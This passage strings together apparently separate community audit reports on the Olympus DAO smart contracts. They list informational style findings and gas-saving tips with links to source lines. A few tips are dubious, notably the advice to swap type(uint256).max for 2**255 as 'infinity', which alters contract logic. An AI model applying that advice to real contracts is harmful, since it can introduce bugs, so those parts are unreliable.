[`VOTES#L18`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L18)  **Description**: This was probably meant as a joke during testing and should probably be renamed for production to not confuse users.  **Recommendation**: Consider renaming the votes module `ERC20` token name `"OlympusDAO Dummy Voting Tokens"` to `"OlympusDAO Voting Tokens"`.   ## [NAZ-N3] Function && Variable Naming Convention **Severity** Informational **Context**: [`Kernel.sol#L131`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L131), [`PRICE.sol#L59`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59), [`TreasuryCustodian.sol#L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L20), [`Operator.sol#L69-L72`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L69-L72), [`Heart.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L45), [`PriceConfig.sol#L11`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L11)  **Description**: The linked variables do not conform to the standard naming convention of Solidity whereby functions and variable names(local and state) utilize the `mixedCase` format unless variables are declared as `constant` in which case they utilize the `UPPER_CASE_WITH_UNDERSCORES` format. Internal/private functions and variables should lead with an `_underscore`.  **Recommendation**: Consider naming conventions utilized by the linked statements are adjusted to reflect the correct type of declaration according to the Solidity style guide.   ## [NAZ-N4] Code Structure Deviates From Best-Practice **Severity**: Informational **Context**: [`Kernel.sol#L71`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L71), [`Kernel.sol#L89`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L89), [`Kernel.sol#L120`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L120), [`Kernel.sol#L224-L230`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L224-L230), [`TRSRY.sol#L20-L39`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L20-L39), [`RANGE.sol#L20-L31`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L20-L31), [`PRICE.sol#L26-L28`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L26-L28), [`INSTR.sol#L11`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L11), [`TreasuryCustodian.sol#L17`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L17), [`Operator.sol#L45-L54`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L45-L54), [`Operator.sol#L188`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L188), [`Governance.sol#L61-L137`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L61-L137)  **Description**: The best-practice layout for a contract should follow the following order: state variables, events, modifiers, constructor and functions. Function ordering helps readers identify which functions they can call and find constructor and fallback functions easier.  Functions should be grouped according to their visibility and ordered as: constructor, receive function (if exists), fallback function (if exists), external, public, internal, private. Some constructs deviate from this recommended best-practice: Modifiers are in the middle of contracts. External/public functions are mixed with internal/private ones. Few events are declared in contracts while most others are in corresponding interfaces.  **Recommendation**: Consider adopting recommended best-practice for code structure and layout.   ## [NAZ-N5] Comment Line Length **Severity**: Informational **Context**: [`RANGE.sol#L40`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L40), [`RANGE.sol#L44`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L44), [`RANGE.sol#L46-L48`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L46-L48), [`RANGE.sol#L61-L62`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L61-L62), [`RANGE.sol#L214`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L214), [`RANGE.sol#L239-L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L239-L240), [`RANGE.sol#L261-L262`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L261-L262), [`PRICE.sol#L19-L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L19-L20), [`PRICE.sol#L31`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L31), [`PRICE.sol#L39-L40`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L39-L40), [`PRICE.sol#L46`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L46), [`PRICE.sol#L78`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#l78), [`PRICE.sol#L120`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L120), [`PRICE.sol#L189`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L189), [`PRICE.sol#L201`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L201), [`PRICE.sol#L203`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L203), [`PRICE.sol#L263-L264`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L263-L264), [`Operator.sol#L97`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97), [`Operator.sol#L199`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L199), [`Operator.sol#L481`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L481), [`Operator.sol#L657`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657), [`Operator.sol#L730`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L730), [`Operator.sol#L734`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L734), [`PriceConfig.sol#L41`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L41), [`PriceConfig.sol#L43`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L43), [`PriceConfig.sol#L66-L67`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L66-L67), [`Governance.sol#L119`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L119), [`Governance.sol#L156`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L156), [`Governance.sol#L158`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L158), [`IBondCallback.sol#L7`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L7), [`IOperator.sol#L13`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13), [`IOperator.sol#L15-L17`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L15-L17), [`IOperator.sol#L34`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L34), [`IOperator.sol#L72-L73`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L72-L73), [`IOperator.sol#L79`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L79), [`IOperator.sol#L84`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L84), [`IOperator.sol#L90-L91`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L90-L91), [`IOperator.sol#L100`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L100), [`IOperator.sol#L108`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L108), [`IOperator.sol#L124`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L124), [`IOperator.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L130), [`IOperator.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L135), [`IOperator.sol#L141`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L141)  **Description**: Max line length must be no more than 120 but many comments are extended past this length.  **Recommendation**: Consider cutting down the line length below 120.   ## [NAZ-N6] Code Contains Empty Blocks **Severity**: Informational **Context**: [`Kernel.sol#L85`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L85), [`Kernel.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L95), [`Kernel.sol#L100`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100), [`Kernel.sol#L105`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L105), [`Kernel.sol#L115`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L115), [`Kernel.sol#L139`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139), [`Kernel.sol#L143`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143), [`TRSRY.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L45), [`VOTES.sol#L19`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L19), [`INSTR.sol#L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L20), [`TreasuryCustodian.sol#L24`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L24), [`PriceConfig.sol#L15`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L15), [`Governance.sol#L59`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L59), [`VoterRegistration.sol#L16`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L16)  **Description**: It's best practice that when there is an empty block, to add a comment in the block explaining why it's empty.  **Recommendation**: Consider adding `/* Comment on why */` to the empty blocks.   ## [NAZ-N7] Use Underscores for Number Literals **Severity**: Informational **Context**: [`RANGE.sol#L245`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L245), [`RANGE.sol#L247`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L247), [`RANGE.sol#L264`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L264), [`Operator.sol#L111`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L111), [`Operator.sol#L518`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L518), [`Operator.sol#L550`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L550), [`Governance.sol#L164`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L164)  **Description**: There are multiple occasions where certain numbers have been hardcoded, either in variables or in the code itself. Large numbers can become hard to read.  **Recommendation**: Consider using underscores for number literals to improve its readability.   ## [NAZ-N8] TODOs Left In The Code **Severity**: Informational **Context**: [`TreasuryCustodian.sol#L51-L52`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L51-L52), [`TreasuryCustodian.sol#L56`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L56), [`Operator.sol#L657`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657)  **Description**: There should never be any TODOs in the code when deploying.  **Recommendation**: Consider finishing the TODOs before deploying.   ## [NAZ-N9] Spelling Errors **Severity**: Informational **Context**: [`PRICE.sol#L126 (numbe => number)`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L126), [`Operator.sol#L295 (deactive => deactivate)`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L295), [`Operator.sol#L326 (deactive => deactivate)`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L326)  **Description**: Spelling errors in comments can cause confusion to both users and developers.  **Recommendation**: Consider checking all misspellings to ensure they are corrected..   ## [NAZ-N10] Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Consider adding in full NatSpec comments for all functions to have complete code documentation for future use.   ## [NAZ-N11] Older Version Pragma **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: Using very old versions of Solidity prevents benefits of bug fixes and newer security checks. Using the latest versions might make contracts susceptible to undiscovered compiler bugs.   **Recommendation**: Consider using the most recent version.
## [NAZ-G1] Moving `if (proposalHasBeenActivated[proposalId_] == true)`  **Context**: [`Governance.sol#L230-L232`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L230-L232)  **Description**: Moving: ```js if (proposalHasBeenActivated[proposalId_] == true) {  revert ProposalAlreadyActivated(); } ``` earlier in `activateProposal()` will make it fail sooner and save gas.  **Recommendation**:  Consider moving `if (proposalHasBeenActivated[proposalId_] == true)` earlier in `activateProposal()`   ## [NAZ-G2] State Variables That Can Be Set To `Immutable` **Context**: [`BondCallback.sol#L28`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L28), [`BondCallback.sol#L32`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)  **Description**: Solidity `0.6.5` introduced `immutable` as a major feature. It allows setting contract-level variables at construction time which gets stored in code rather than storage. Each call to it reads from storage, using a `sload` costing 2100 gas cold or 100 gas warm. Setting it to `immutable` will have each storage read of the state variable to be replaced by the instruction `push32 value`, where `value` is set during contract construction time and this costs only 3 gas.  **Recommendation**:  Set the state variable to `immutable`.   ## [NAZ-G3] Right Shift Instead of Dividing By 2 **Context**: [`Operator.sol#L372`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L372), [`Operator.sol#L427`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L427)  **Description**: The `SHR` opcode is 3 gas cheaper than `DIV` and also bypasses Solidity's division by 0 prevention overhead.  **Recommendation**:  Consider using right shift instead of dividing by 2.   ## [NAZ-G4] Functions Visibility Can Be Declared External **Context**: [`Kernel.sol#L439`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439), [`Kernel.sol#L451`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451), [`TRSRY.sol#L75`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75), [`MINTR.sol#L33`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33), [`MINTR.sol#L37`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37), [`RANGE.sol#L215`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L215), [`VOTES.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45), [`VOTES.sol#L51`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L51), [`INSTR.sol#L37`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37), [`Governance.sol#L145`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L145), [`Governance.sol#L151`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L151)  **Description**: Several functions across multiple contracts have a public visibility and can be marked with external visibility to save gas.   **Recommendation**:  Change the functions visibility to external to save gas.   ## [NAZ-G5] Use `calldata` Instead of `memory` For Function Parameters **Context**: [`TreasuryCustodian.sol#L53`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53), [`BondCallback.sol#L152`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152)  **Description**: The dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload.  **Recommendation**:  Use `calldata` instead of `memory` for function parameters to avoid using memory with array values when a function is getting called externally.   ## [NAZ-G6] For array elements, `arr[i] = arr[i] + 1` is cheaper than `arr[i] += 1` **Context**: [`TRSRY.sol#L96-L97`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96-L97), [`TRSRY.sol#L131`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131), [`VOTES.sol#L58`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58), [`BondCallback.sol#L143-L144`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143-L144), [`Governance.sol#L198`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198), [`Governance.sol#L252`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252), [`Governance.sol#254`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  **Description**: Due to stack operations this is 25 gas cheaper when dealing with arrays in storage, and 4 gas cheaper for memory arrays.  **Recommendation**:  Use `arr[i] = arr[i] + 1` instead of `arr[i] += 1` when dealing with arrays   ## [NAZ-G7] Use `++index` instead of `index++` to increment a loop counter **Context**: [`KernelUtils.sol#L49`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49), [`KernelUtils.sol#L64`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)  **Description**: Due to reduced stack operations, using `++index` saves 5 gas per iteration.  **Recommendation**:  Use `++index `to increment a loop counter.   ## [NAZ-G8] Use of `2**256 - 1 && type(uint256).max` When `2**255` Can Be Used **Context**: [`TRSRY.sol#L147`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L147), [`RANGE.sol#L88`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L88), [`RANGE.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L95), [`RANGE.sol#L221`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L221), [`RANGE.sol#L230`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L230), [`Operator.sol#L167`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L167), [`Operator.sol#L477`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L477), [`Operator.sol#L603`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L603), [`BondCallback.sol#L57`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L57), [`BondCallback.sol#L95`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L95)  **Description**: Infinity can also be represented via ``2**255`, it's hex representation is `0x8000000000000000000000000000000000000000000000000000000000000000` while `2**256 - 1` is `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`. Then main difference is and where the gas savings come from is, zeros are cheaper than non-zero values in hex representation.  **Recommendation**:  Use `2**255` instead of `2**256 - 1` to save gas on deployment.   ## [NAZ-G9] Setting The Constructor To Payable **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: You can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of `msg.value == 0` and saves 21 gas on deployment with no security risks.  **Recommendation**:  Set the constructor to payable.   ## [NAZ-G10] Function Ordering via Method ID **Context**: [`All Contracts`](https://github.com/code-423n4/2022-08-olympus/tree/main/src)  **Description**: Contracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [`This tool`](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.  **Recommendation**:  Find a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas. 
# Index [G01] Post-increment/decrement cost more gas then pre-increment/decrement [G02] Array length should not be looked up in every loop of a for-loop [G03] Operatos <= or >= cost more gas than operators < or > [G04] != 0 is cheaper than > 0 [G05] Variable1 = Variable1 + (-) Variable2 is cheaper in gas cost than variable1 += (-=) variable2. [G06] Using private rather than public for constants [G07] Don't compare boolean expressions to boolean literals [G08] Usage of uints/ints smaller than 32 Bytes (256 bits) incurs overhead [G09] Initialize variables with default values are not needed [G10] Using bools for storage incurs overhead [G11] Multiplication/division by two should use bit shifting [G12] Calldata vs Memory [G13] Use a more recent version of solidity [G14] Using storage instead of memory for structs/arrays [G15] Tight variable packing  [G16] Move variable declaration before is going to be used [G17] Refactoring code [G18] Use unchecked when it's not possible to overflow [G19] Internal functions only called once can be inlined to save gas [G20] Remove unused functions  # Details ## [G01] Post-increment/decrement cost more gas then pre-increment/decrement ### Description ++I (--I) cost less gas than I++ (I--) especially in a loop.  ### Proof of concept  ```solidity contract TestPost {  function testPost() public {   uint256 i;   i++;  } } contract TestPre {  function testPre() public {   uint256 i;   ++i;  } } ```  - Transaction cost of testPost is 21333 gas - Transaction cost of testPre is 21328 gas  - After the test it's possible to save **5 gas per ocurrence** with this optimization.  ### Lines in the code [KernelUtils.sol#L49](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L49) [KernelUtils.sol#L64](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L64) [Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L488) [Operator.sol#L670](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L670) [Operator.sol#L686](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L686)  ## [G02] Array length should not be looked up in every loop of a for-loop ### Description Storage array length checks incur an extra Gwarmaccess (100 gas) per loop.  Store the array length in a variable and use it in the for loop helps to save gas.  ### Proof of concept ```solidity contract TestForLength {  function testArrayLength() public {   uint256[] memory array = new uint256[](10);   for(uint256 i; i < array.length; ){    ++i;   }  } } contract TestForCachLength {  function testArrayLength() public {   uint256[] memory array = new uint256[](10);   uint256 arrayLen = array.length;   for(uint256 i; i < arrayLen; ){    ++i;   }  } } ``` - Transaction cost of TestForLength is 23217 gas - Transaction cost of TestForCachLength is 23200 gas  - After the test it's possible to save 17 gas in this loop so this mean **~2 gas per loop** is saved with this optimization in the test case of a local array.  ### Lines in the code [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L278)  ## [G03] Operatos <= or >= cost more gas than operators < or > ### Description Change all <= / >= operators for < / > and remember to increse / decrese in consecuence to maintain the logic (example, a <= b for a < b + 1)  ### Proof of concept  ```solidity contract TestMaxEqual {   function testMaxEqual() public {   uint256 i = 1;   if (i >= 1){    i++;   }  } }  contract TestMax {   function TestMax() public {   uint256 i = 1;   if (i > 0){    i++;   }  } } ```  - Transaction cost of TestMaxEqual is 21367 gas - Transaction cost of TestMax is 21364 gas  - After the test it's possible to save **3 gas per ocurrence** with this optimization.  ### Lines in the code [Operator.sol#L210](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L210) [Operator.sol#L211](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L211) [Operator.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L216) [Operator.sol#L217](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L217) [Operator.sol#L486](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L486) [Operator.sol#L667](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L667) [Operator.sol#L683](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L683)  ## [G04] != 0 is cheaper than > 0 ### Description Replace all > 0 for != 0  ### Lines in the code [Governance.sol#L247](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L247)  ## [G05] Variable1 = Variable1 + (-) Variable2 is cheaper in gas cost than variable1 += (-=) variable2. ### Description   ### Lines in the code [TRSRY.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L96) [TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L97) [TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L115) [TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L116) [TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L131) [TRSRY.sol#L132](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L132) [PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L136) [PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L138) [PRICE.sol#L222](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L222) [VOTES.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L56) [VOTES.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L58) [BondCallback.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L143) [BondCallback.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L144) [Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L103) [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L194) [Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L198) [Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L252) [Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L254)  ## [G06] Using private rather than public for constants ### Description If needed, the value can be read from the verified contract source code.  Savings are due to the compiler not having to create non-payable getter functions for deployment calldata,  and not adding another entry to the method ID table.  ### Lines in the code [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L65) [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59) [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89) [Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L121) [Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L124) [Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L127) [Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L130) [Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L133) [Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L137)  ## [G07] Don't compare boolean expressions to boolean literals ### Description if (<x> == true) => if (<x>), if (<x> == false) => if (!<x>)  ### Lines in the code 